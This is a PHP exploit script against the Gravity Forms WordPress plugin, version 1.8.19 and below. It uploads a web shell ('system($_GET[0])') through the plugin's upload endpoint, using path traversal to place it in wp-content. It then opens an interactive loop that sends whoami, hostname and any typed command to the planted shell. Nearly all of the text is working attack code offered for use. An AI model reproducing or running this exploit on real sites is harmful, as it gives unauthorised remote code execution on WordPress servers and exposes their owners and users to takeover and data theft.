/****************************************************************************************************************************
   *
    * Exploit Title        : Gravity Forms [WP] - Arbitrary File Upload
    * Vulnerable Version(s): 1.8.19 (and below)
    * Write-Up             : https://blog.sucuri.net/2015/02/malware-cleanup-to-arbitrary-file-upload-in-gravity-forms.html
    * Coded by             : Abk Khan [ an0nguy @ protonmail.ch ]
  *
*****************************************************************************************************************************/
error_reporting(0);
 
echo "
   _____                 _ _         ______    _ _     
  / ____|               (_) |       |  ____|  | | |    
 | |  __ _ __ __ ___   ___| |_ _   _| |__ __ _| | |___ 
 | | |_ | &#039;__/ _` \ \ / / | __| | | |  __/ _` | | / __|
 | |__| | | | (_| |\ V /| | |_| |_| | | | (_| | | \__ \
  \_____|_|  \__,_| \_/ |_|\__|\__, |_|  \__,_|_|_|___/
                                __/ |                  
                               |___/     > an Exploiter by AnonGuy\n";
$url       = "$domain/?gf_page=upload";
$shell     = "$domain/wp-content/_input_3_khan.php5";
$separator = &#039;-------------------------------------------------------------------&#039;;
 
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, &#039;<?php system($_GET[0]); ?>&form_id=1&name=khan.php5&gform_unique_id=../../../../&field_id=3&#039;);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
 
if (strpos($response, &#039;"ok"&#039;) !== false) {
    echo "$separator\nShell at $shell\n$separator\nSpawning a &#039;No-Session&#039; Shell . . . Done!\n$separator\n";
    while ($testCom != &#039;exit&#039;) {
        $user    = trim(get_string_between(file_get_contents("$shell?0=echo%20&#039;~&#039;;%20whoami;%20echo%20&#039;~&#039;"), &#039;~&#039;, &#039;~&#039;));
        $b0x     = trim(get_string_between(file_get_contents("$shell?0=echo%20&#039;~&#039;;%20hostname;%20echo%20&#039;~&#039;"), &#039;~&#039;, &#039;~&#039;));
        echo "$user@$b0x:~$ ";
        $handle  = fopen("php://stdin", &#039;r&#039;);
        $testCom = trim(fgets($handle));
        fclose($handle);
        $comOut  = trim(get_string_between(file_get_contents("$shell?0=echo%20&#039;~&#039;;%20" . urlencode($testCom) . ";%20echo%20&#039;~&#039;"), &#039;~&#039;, &#039;~&#039;)) . "\n";
        echo $comOut;
    }
}
else {
    die("$separator\n$domain doesn&#039;t seem to be vulnerable! :(\n$separator");
}
 
function get_string_between($string, $start, $end)
{
    # stolen from stackoverflow!
    $string = &#039; &#039; . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return &#039;&#039;;
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
?>

